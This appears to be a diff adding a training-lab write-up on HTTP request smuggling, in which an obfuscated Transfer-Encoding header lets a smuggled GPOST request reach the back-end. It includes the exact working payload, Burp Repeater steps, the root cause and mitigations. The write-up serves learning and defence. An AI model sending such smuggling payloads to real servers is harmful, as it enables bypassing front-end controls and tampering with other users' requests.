@@ -1,0 +1,47 @@
+obfuscated TE header 
+
+Lab Difficulty: Practitioner
+Vulnerability: HTTP request smuggling  front-end  back-end header handling mismatch
+
+Summary
+Two servers in front of each other handle duplicate headers differently. The front-end blocks methods other than GET and POST, but the back-end is more forgiving. By smuggling a crafted request that uses an obfuscated Transfer-Encoding header, you can cause the back-end to see the next request as coming in with a weird method named GPOST. The end result: the back-end complains with “Unrecognized method GPOST” and the lab is solved.
+
+Steps taken
+
+Opened the lab in Burp and switched Repeater to use HTTP/1.1 (the lab’s intended techniques only work in HTTP/1.1).
+
+In Repeater turned off the automatic Content-Length update (uncheck Update Content-Length). That’s important because we need full control of the length fields.
+
+Built the smuggling request and sent it twice. The payload I used was exactly:
+
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: cow
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+
+Important notes about the payload:
+The request contains both a Content-length header and a Transfer-Encoding header. The front-end and back-end parse duplicate headers differently, which is what we’re abusing.
+The chunked body starts with the chunk size “5c” followed by our smuggled request.
+Make sure to include the final CRLF sequence after the terminal “0” so the request framing is exactly right.
+4. Sent that request once to prime things, then sent it a second time. The second response returned the expected message: Unrecognized method GPOST. That confirms the back-end processed the smuggled request as a separate request with method GPOST.
+
+Root cause
+The front-end and back-end disagree about how to handle duplicate transfer-related headers and message framing. The front-end enforces methods and blocks non-GET/POST, but the back-end interprets the framing differently and ends up parsing part of the body as a new request. Because the smuggled content begins with what looks like a request line, the backend treats it as a separate request using the GPOST method. In short: inconsistent header parsing and improper handling of conflicting length/transfer headers led to a request smuggling condition.
+
+Fixes and mitigation
+Normalize and strictly enforce header handling at the front-end so it never passes ambiguous requests to the back-end.
+Reject requests that contain both Transfer-Encoding and Content-Length headers in the same request, or canonicalize them consistently.
+Ensure proxies and upstream servers use the same HTTP parsing rules and versions.
+Apply strict allowlists for HTTP methods at the front-end and validate request framing before forwarding.
+Monitor for unusual request framing or odd method names in logs, since request smuggling often shows up as weird parsing errors.
